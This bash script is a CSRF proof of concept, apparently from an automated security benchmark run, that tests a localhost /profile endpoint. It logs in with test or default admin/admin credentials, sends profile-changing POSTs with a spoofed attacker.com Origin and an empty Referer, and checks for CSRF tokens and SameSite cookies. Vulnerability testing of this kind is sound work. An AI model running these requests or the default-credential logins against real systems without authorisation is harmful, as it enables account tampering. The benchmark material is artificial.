#!/bin/bash
# POC: Bash script to verify CSRF vulnerability on /profile endpoint - Tests origin validation, CSRF token presence, and SameSite cookie attributes
# Target: ./repo
# Created: 2025-12-02T16:24:03.976Z
# Session: benchmark-XBEN-104-24-mioryccy

# CSRF Vulnerability POC for /profile Endpoint
# This script demonstrates that the /profile endpoint accepts POST requests without CSRF token validation

TARGET_URL="http://localhost:8080"
PROFILE_ENDPOINT="${TARGET_URL}/profile"

echo "=========================================="
echo "CSRF on /profile Endpoint - POC"
echo "=========================================="
echo ""

# First, we need to get a valid session by logging in
echo "[*] Step 1: Authenticating to get a valid session..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST \
  -d "username=test&password=test" \
  "${TARGET_URL}/login")

if echo "$LOGIN_RESPONSE" | grep -q "Incorrect"; then
  echo "[-] Login failed. Trying with default credentials..."
  curl -s -c /tmp/cookies.txt -X POST \
    -d "username=admin&password=admin" \
    "${TARGET_URL}/login" > /dev/null
fi

echo "[+] Session obtained and stored in cookies"
echo ""

# Test 1: POST with suspicious Origin header (simulating cross-origin request)
echo "[*] Test 1: Sending POST from different origin (Origin: http://attacker.com)"
RESPONSE=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt -X POST \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/csrf.html" \
  -d "name=TestCSRF&lastname=Attack&email=csrf@attacker.com&loan_amount=5000&loan_term_months=12&monthly_payment=500" \
  "${PROFILE_ENDPOINT}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
  echo "[+] VULNERABLE: Server accepted request from different origin!"
  echo "    Response: $(echo "$BODY" | head -c 200)"
else
  echo "[-] Request was rejected or redirected"
  echo "    Response: $(echo "$BODY" | head -c 200)"
fi
echo ""

# Test 2: POST without Referer header
echo "[*] Test 2: Sending POST without Referer header"
RESPONSE=$(curl -s -w "\n%{http_code}" -b /tmp/cookies.txt -X POST \
  -H "Referer:" \
  -d "name=TestCSRF2&lastname=Attack2&email=csrf2@attacker.com&loan_amount=7500&loan_term_months=24&monthly_payment=350" \
  "${PROFILE_ENDPOINT}")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
  echo "[+] VULNERABLE: Server accepted request without Referer header!"
  echo "    Response: $(echo "$BODY" | head -c 200)"
else
  echo "[-] Request was rejected"
fi
echo ""

# Test 3: Check if form has CSRF token by fetching the profile page
echo "[*] Test 3: Checking if profile form contains CSRF token..."
FORM=$(curl -s -b /tmp/cookies.txt "${PROFILE_ENDPOINT}")

if echo "$FORM" | grep -q "csrf_token\|_csrf\|anti.*csrf"; then
  echo "[-] CSRF token field found in form (protected)"
else
  echo "[+] VULNERABLE: No CSRF token found in form!"
fi
echo ""

# Test 4: Check session cookie for SameSite attribute
echo "[*] Test 4: Checking session cookie SameSite attribute..."
COOKIE_HEADER=$(curl -s -i -b /tmp/cookies.txt "${PROFILE_ENDPOINT}" 2>&1 | grep -i "set-cookie")

if [ -z "$COOKIE_HEADER" ]; then
  echo "[*] No Set-Cookie in response (checking existing cookie handling)"
fi

if echo "$COOKIE_HEADER" | grep -qi "SameSite"; then
  echo "[-] SameSite attribute found (protected)"
else
  echo "[+] VULNERABLE: SameSite attribute not set on session cookie!"
fi
echo ""

echo "=========================================="
echo "CSRF POC Complete"
echo "=========================================="
echo ""
echo "Summary: The /profile endpoint is vulnerable to CSRF attacks:"
echo "  - Accepts requests from different origins"
echo "  - Does not validate CSRF tokens"
echo "  - Session cookie lacks SameSite protection"
echo ""